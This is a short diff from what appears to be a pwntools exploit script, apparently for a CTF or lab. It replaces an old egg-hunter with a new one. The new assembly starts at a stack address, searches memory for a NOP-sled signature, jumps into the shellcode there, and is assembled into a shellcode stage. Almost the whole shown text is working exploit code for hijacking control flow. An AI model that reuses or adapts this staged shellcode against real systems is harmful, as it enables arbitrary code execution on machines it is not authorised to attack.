@@ -112,19 +112,45 @@ stack_addr_int = stack_addr_int + OFFSET
 #     jmp [rsi+8]
 # """
 
-smallAsm = r"""
-_start:
-    mov rsi, rsp
-    mov rax, 0x7430307730303077
-L:
-    cmp qword [rsi], rax
-    je  F
-    inc rsi
-    jmp L
-F:
-    add rsi, 8
-    jmp rsi
+# smallAsm = r"""
+# _start:
+#     mov rsi, rsp
+#     mov rax, 0x7430307730303077
+# L:
+#     cmp qword [rsi], rax
+#     je  F
+#     inc rsi
+#     jmp L
+# F:
+#     add rsi, 8
+#     jmp rsi
+# """
+
+signature = 0x90909090
+
+# smallAsm = f"""
+# mov rdi, {stck_addr}
+# mov eax, {signature}
+# find:
+#     inc rdi
+#     cmp dword ptr [rdi], eax
+#     jne find
+#     add rdi, 0x4
+#     jmp rdi
+# """
+
+smallAsm = f"""
+mov rdi, {stck_addr}
+mov eax, {signature}
+small_loop:
+    add rdi, 1
+    cmp dword ptr [rdi], eax
+    jne small_loop
+    add rdi, 0x4
+    jmp rdi
 """
+
+
 # bfc03190
 smallShellCode = asm(smallAsm, extract=True, arch="amd64", os="linux")
 smallShellCodeLen = len(smallShellCode)
